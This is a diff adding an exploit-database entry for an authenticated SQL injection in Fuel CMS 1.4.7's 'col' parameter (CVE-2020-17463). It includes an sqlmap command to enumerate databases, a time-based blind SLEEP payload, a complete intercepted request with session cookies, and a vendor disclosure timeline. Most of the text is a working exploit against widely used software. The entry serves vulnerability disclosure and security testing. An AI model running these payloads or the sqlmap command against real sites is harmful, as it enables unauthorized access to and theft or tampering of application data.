@@ -1,0 +1,58 @@
+# Exploit Title: Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)
+# Google Dork: -
+# Date: 2020-08-01
+# Exploit Author: Roel van Beurden
+# Vendor Homepage: https://www.getfuelcms.com/
+# Software Link: https://github.com/daylightstudio/FUEL-CMS/archive/1.4.7.zip
+# Version: 1.4.7
+# Tested on: Linux Ubuntu 18.04
+# CVE: CVE-2020-17463
+
+
+1. Description:
+----------------------
+
+Fuel CMS 1.4.7 allows SQL Injection via parameter 'col' in pages/items, permissions/items, navigation/items and logs/items
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+
+2. Proof of Concept:
+----------------------
+
+In Burpsuite intercept the request from one of the affected pages with 'col' parameter and save it like fuel.req
+Then run SQLmap to extract the data from the database:
+
+sqlmap -r fuel.req --risk=3 --level=5 --dbs --random-agent
+
+
+3. Example payload:
+----------------------
+
+(time-based blind)
+
+/fuelcms/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(5)))ULQV)&fuel_inline=0
+
+
+4. Burpsuite request:
+----------------------
+
+GET /fuelcms/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location%20AND%20(SELECT%201340%20FROM%20(SELECT(SLEEP(5)))ULQV)&fuel_inline=0 HTTP/1.1
+
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+
+Cookie: ci_session=2pvc8gmus9he9fbesp3lkhlbc7oal188; fuel_eeed351bf4de904070ff77c1aef15576=a%3A2%3A%7Bs%3A2%3A%22id%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22language%22%3Bs%3A7%3A%22english%22%3B%7D; fuel_ui_eeed351bf4de904070ff77c1aef15576=%2528%257Bleftnav_h3%253A%25220%257C0%257C0%257C0%2522%252C%2520fuel_permissions_items%253A%2522list%2522%252C%2520fuel_pages_items%253A%2522list%2522%252C%2520leftnav_hide%253A%25220%2522%252C%2520tabs_ms_assets_create%253A%25220%2522%252C%2520tabs_ms_assets_create_5a47396a63773d3d%253A%25220%2522%252C%2520tabs_ms_assets_create_5a47396a637939305a584e30%253A%25220%2522%252C%2520tabs_ms_assets_create_615731685a32567a%253A%25220%2522%252C%2520fuel_navigation_items%253A%2522list%2522%257D%2529
+
+Upgrade-Insecure-Requests: 1
+
+
+5. Timeline:
+----------------------
+
+2020-08-01: SQLi vulnerability found in Fuel CMS 1.4.7
+2020-08-02: Reported vulnerability to vendor
+2020-08-11: Vendor has patched the SQLi vulnerability in version 1.4.8
